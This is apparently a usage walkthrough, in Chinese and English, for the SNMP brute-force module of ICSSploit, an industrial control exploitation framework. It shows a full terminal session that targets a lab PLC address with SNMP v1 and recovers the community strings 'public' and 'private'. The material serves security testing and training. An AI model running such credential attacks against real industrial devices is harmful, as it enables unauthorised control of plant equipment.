# SNMP Bruteforece

# 使用SNMP Bruteforece module
    root@kali:~/Desktop/temp/isf# python isf.py
    
      _____ _____  _____ _____ _____  _      ____ _____ _______
     |_   _/ ____|/ ____/ ____|  __ \| |    / __ \_   _|__   __|
       | || |    | (___| (___ | |__) | |   | |  | || |    | |
       | || |     \___ \\___ \|  ___/| |   | |  | || |    | |
      _| || |____ ____) |___) | |    | |___| |__| || |_   | |
     |_____\_____|_____/_____/|_|    |______\____/_____|  |_|
    
    
                    ICS Exploitation Framework
    
    Note     : ICSSPOLIT is fork from routersploit at
               https://github.com/reverse-shell/routersploit
    Dev Team : wenzhe zhu(dark-lbp)
    Version  : 1.0
    
    Exploits: 2 Scanners: 0 Creds: 13
    
    ICS Exploits:
        PLC: 2          ICS Switch: 0
        Software: 0
    
    isf > search snmp
    creds/snmp_bruteforce
    isf > use creds/snmp_bruteforce
    isf (SNMP Bruteforce) >

    
# 设置目标参数
    isf (SNMP Bruteforce) > show options

    Target options:
    
       Name       Current settings     Description
       ----       ----------------     -----------
       target                          Target IP address or file with target:port (file://)
       port       161                  Target port
    
    
    Module options:
    
       Name                Current settings                                               Description
       ----                ----------------                                               -----------
       version             2                                                              Snmp version 1:v1, 2:v2c
       threads             8                                                              Number of threads
       stop_on_success     yes                                                            Stop on first valid community string
       verbosity           yes                                                            Display authentication attempts
       snmp                file:///root/Desktop/temp/isf/icssploit/wordlists/snmp.txt     Community string or file with community strings (file://)
    
    isf (SNMP Bruteforce) > set target 192.168.70.210
    [+] {'target': '192.168.70.210'}
    # 部分PLC设备只支持snmp v1版本
    isf (SNMP Bruteforce) > set version 1
    [+] {'version': '1'}

# 执行暴力破解
    isf (SNMP Bruteforce) > run
    [*] Running module...
    [*] worker-0 thread is starting...
    [*] worker-1 thread is starting...
    [*] worker-2 thread is starting...
    [*] worker-3 thread is starting...
    [*] worker-4 thread is starting...
    [*] worker-5 thread is starting...
    [*] worker-6 thread is starting...
    [*] worker-7 thread is starting...
    [+] Target: 192.168.70.210:161 worker-0: Valid community string found - String: 'public'
    [*] worker-0 thread is terminated.
    [*] worker-4 thread is terminated.
    [+] Target: 192.168.70.210:161 worker-1: Valid community string found - String: 'private'
    [*] worker-1 thread is terminated.
    [*] worker-6 thread is terminated.
    [*] worker-5 thread is terminated.
    [*] worker-7 thread is terminated.
    [-] Target: 192.168.70.210:161 worker-2: Invalid community string - String: 'wheel'
    [*] worker-2 thread is terminated.
    [-] Target: 192.168.70.210:161 worker-3: Invalid community string - String: '0'
    [*] worker-3 thread is terminated.
    [*] Elapsed time:  6.13672208786 seconds
    [+] Credentials found!
    
       Target             Port     Community Strings
       ------             ----     -----------------
       192.168.70.210     161      public
       192.168.70.210     161      private
    
    isf (SNMP Bruteforce) >